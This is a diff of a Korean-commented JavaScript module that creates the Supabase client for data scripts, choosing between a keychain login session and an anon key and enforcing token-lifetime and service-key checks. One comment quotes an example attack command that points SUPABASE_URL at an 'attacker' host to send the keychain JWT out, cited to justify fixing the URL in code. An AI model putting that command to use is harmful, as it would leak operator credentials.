@@ -1,7 +1,7 @@
 // Supabase 클라이언트를 만드는 유일한 곳(ADR-016 v5: Auth 로그인 모델, service 키 없음). 인증은 두 출처 중 하나로, 스크립트 종류가 고른다:
-//   1. 키체인의 로그인 세션(`pnpm data:login` 이 넣은 access token) — 쓰기 스크립트(collect·analyze·apply·seed). publishable 키 + `Authorization: Bearer <JWT>` 로
+//   1. 키체인의 로그인 세션(`pnpm data login` 이 넣은 access token) — 쓰기 스크립트(collect·analyze·apply·seed). publishable 키 + `Authorization: Bearer <JWT>` 로
 //      PostgREST 에 가고, RLS 가 `operators` 허용 목록으로 가른다. `exp` 가 지났으면 여기서 멈추고 다시 로그인하라고 한다.
-//   2. publishable 키만(anon) — `data:pull`(readOnly). Vercel 빌드와 로컬이 같은 경로다. RLS 가 published places·items 의 select 만 허용한다.
+//   2. publishable 키만(anon) — `pnpm data pull`(readOnly). Vercel 빌드와 로컬이 같은 경로다. RLS 가 published places·items 의 select 만 허용한다.
 // service_role 키는 어디서도 쓰지 않는다(v5 에서 Actions 폐지) — env 에 있으면 "안 쓴다" 가 아니라 **멈춘다**(resolveSupabaseCredentials 의 트립와이어).
 // 값은 이 프로세스 안에만 있고 찍지 않는다 — 어느 출처를 썼는지(이름)만 로그에 남긴다. 경계는 세 가지뿐이다: 파일에 값이 없다 · `exp`(≤1일) ·
 // RLS 범위. 키체인 deny 는 이 머신에서 경계가 아니다(`node -e` 로 읽힌다) — 읽어도 하루면 죽고 운영자 권한 밖은 못 하게 하는 것이 설계다.
@@ -16,7 +16,7 @@ export { PROJECT_REF, PUBLISHABLE_KEY, assertPublishableKey, projectUrl } from '
 
 const ROOT = new URL('../../', import.meta.url);
 
-// 만료 직전 토큰으로 긴 `data:analyze`(한 실행이 세션 창 안에 끝나야 한다 — analyzeCandidates.mjs 의 DEFAULT_LIMIT 주석) 를 시작해 중간에 401 로 죽지 않게, 이만큼 앞당겨 "만료" 로 본다.
+// 만료 직전 토큰으로 긴 `pnpm data analyze`(한 실행이 세션 창 안에 끝나야 한다 — analyzeCandidates.mjs 의 DEFAULT_LIMIT 주석) 를 시작해 중간에 401 로 죽지 않게, 이만큼 앞당겨 "만료" 로 본다.
 export const SESSION_EXP_SKEW_S = 30 * 60;
 // 요구 ⑤ "토큰 1일 미만" 을 코드가 단언한다 — 대시보드 JWT expiry 는 값 없이 검증할 수 없으니, 더 긴 토큰은 세션으로 쓰지도 저장하지도 않는다.
 export const SESSION_MAX_TTL_S = 24 * 60 * 60;
@@ -47,12 +47,12 @@ function linkedProjectRef() {
   }
 }
 
-const LOGIN_HINT = '사용자 터미널에서 `pnpm data:login`(이메일·비밀번호) 뒤 다시 실행. 에이전트 세션 안에서는 되지 않는다.';
+const LOGIN_HINT = '사용자 터미널에서 `pnpm data login`(이메일·비밀번호) 뒤 다시 실행. 에이전트 세션 안에서는 되지 않는다.';
 
 // 세션 수명이 하루를 넘으면 세션으로 쓰지 않는다(login.mjs 도 저장 전에 같은 검사). 반환: 문제 없으면 undefined, 있으면 이유.
 export function sessionTtlProblem(exp, now) {
   if (exp - now > SESSION_MAX_TTL_S) {
-    return `세션 수명이 하루를 넘는다(만료 ${formatTime(exp)}) — 대시보드 Authentication → JWT expiry 를 86400 이하로 내리고 다시 pnpm data:login`;
+    return `세션 수명이 하루를 넘는다(만료 ${formatTime(exp)}) — 대시보드 Authentication → JWT expiry 를 86400 이하로 내리고 다시 pnpm data login`;
   }
   return undefined;
 }
@@ -61,7 +61,7 @@ export function sessionTtlProblem(exp, now) {
 // readOnly(pull-db): **항상 anon** — 세션이 있어도 쓰지 않는다. published 만 읽는 스크립트에 운영자 토큰을 실을 이유가 없고, 그래야
 // Vercel 과 로컬이 같은 경로로 돌며, 비운영자 세션이 빈 결과를 내는 경우도 없다. 쓰기 스크립트는 세션이 없거나 만료면 그 자리에서 멈춘다 —
 // anon 으로 보내면 첫 insert 에서 RLS 42501 로 죽는데, 그 메시지는 "로그인하라" 로 읽히지 않는다.
-// URL 은 코드 상수로 고정한다(env 로 못 바꾼다) — 바꿀 수 있으면 `SUPABASE_URL=https://attacker pnpm data:apply` 한 줄이 키체인 JWT 를 밖으로 보낸다.
+// URL 은 코드 상수로 고정한다(env 로 못 바꾼다) — 바꿀 수 있으면 `SUPABASE_URL=https://attacker pnpm data apply` 한 줄이 키체인 JWT 를 밖으로 보낸다.
 export function resolveSupabaseCredentials({
   env = process.env,
   readSession = readKeychainSession,
@@ -77,14 +77,14 @@ export function resolveSupabaseCredentials({
   assertPublishableKey(publishableKey);
   if (!publishableKey) throw new Error('publishable 키가 코드에 없다 — scripts/lib/supabasePublic.mjs 의 PUBLISHABLE_KEY(대시보드 Project Settings → API Keys 의 Publishable key 행, 공개값).');
   // readOnly 는 env 에 service 키가 남아 있어도 anon 이다 — "빌드는 anon" 이 env 정리 순서가 아니라 코드 불변식이 되게(1b4264c). 다만 조용히 넘기면
-  // 감지가 사라진다: 옛 .env.local 잔존을 처음 잡은 것이 `data:pull` 의 출처 로그였다. 그래서 이름만 `ignoredEnv` 에 얹고 createSupabase 가 한 줄 경고로 찍는다.
+  // 감지가 사라진다: 옛 .env.local 잔존을 처음 잡은 것이 `pnpm data pull` 의 출처 로그였다. 그래서 이름만 `ignoredEnv` 에 얹고 createSupabase 가 한 줄 경고로 찍는다.
   if (readOnly) {
     return { url, key: publishableKey, source: 'anon', ...(env.SUPABASE_SERVICE_ROLE_KEY ? { ignoredEnv: ['SUPABASE_SERVICE_ROLE_KEY'] } : {}) };
   }
   // 트립와이어(경계가 아니라 사고 감지용): v5 는 service 키를 어디서도 쓰지 않으므로 env 에 "있다" 자체가 사고다. CI 든 아니든 멈춘다 — 예외를 두면(옛 `CI=1`)
   // 그 한 줄로 넘어가고, 조용히 무시하면 감지가 사라진다. 세션이 유효해도 먼저 본다: 키를 지우기 전엔 쓰기 스크립트가 돌지 않게.
   if (env.SUPABASE_SERVICE_ROLE_KEY) {
-    throw new Error('로컬 env 에 SUPABASE_SERVICE_ROLE_KEY 가 있다 — ADR-016 v5 는 service 키를 어디서도 쓰지 않는다. 셸·.env.local 에서 지우고 `pnpm data:login` 세션으로 붙는다.');
+    throw new Error('로컬 env 에 SUPABASE_SERVICE_ROLE_KEY 가 있다 — ADR-016 v5 는 service 키를 어디서도 쓰지 않는다. 셸·.env.local 에서 지우고 `pnpm data login` 세션으로 붙는다.');
   }
 
   const token = readSession();
@@ -97,7 +97,7 @@ export function resolveSupabaseCredentials({
   // 진짜 만료와 skew 창 안을 나눠 말한다 — 후자를 "만료됐다(미래 시각)" 로 쓰면 시계가 틀린 것처럼 읽힌다.
   if (exp <= at) throw new Error(`로그인 세션이 만료됐다(${formatTime(exp)}) — ${LOGIN_HINT}`);
   if (sessionUsableUntil(exp) <= at) {
-    throw new Error(`로그인 세션이 만료 ${SESSION_EXP_SKEW_MIN}분 전이라 세션으로 쓰지 않는다(만료 ${formatTime(exp)} — 긴 data:analyze 가 중간에 죽지 않게 ${SESSION_EXP_SKEW_MIN}분 앞당겨 본다) — ${LOGIN_HINT}`);
+    throw new Error(`로그인 세션이 만료 ${SESSION_EXP_SKEW_MIN}분 전이라 세션으로 쓰지 않는다(만료 ${formatTime(exp)} — 긴 pnpm data analyze 가 중간에 죽지 않게 ${SESSION_EXP_SKEW_MIN}분 앞당겨 본다) — ${LOGIN_HINT}`);
   }
   return { url, key: publishableKey, source: 'session', accessToken: token, expiresAt: exp };
 }
@@ -116,7 +116,7 @@ export function ignoredEnvWarning(creds) {
 }
 
 // 스크립트 진입점용: 실패하면 이유를 찍고 exit 1. 조용히 스냅샷으로 넘어가지 않는다(Vercel 빌드가 옛 데이터로 돌아가는 걸 막는다).
-// 어느 출처를 썼는지 한 줄 찍는다 — 두 출처는 `data:pull` 결과가 같아 로그 없이는 무엇으로 붙었는지 알 수 없다. 옛 .env.local 잔존을 처음 잡은 것도 이 로그였다.
+// 어느 출처를 썼는지 한 줄 찍는다 — 두 출처는 `pnpm data pull` 결과가 같아 로그 없이는 무엇으로 붙었는지 알 수 없다. 옛 .env.local 잔존을 처음 잡은 것도 이 로그였다.
 export function createSupabase({ readOnly = false } = {}) {
   let creds;
   try {
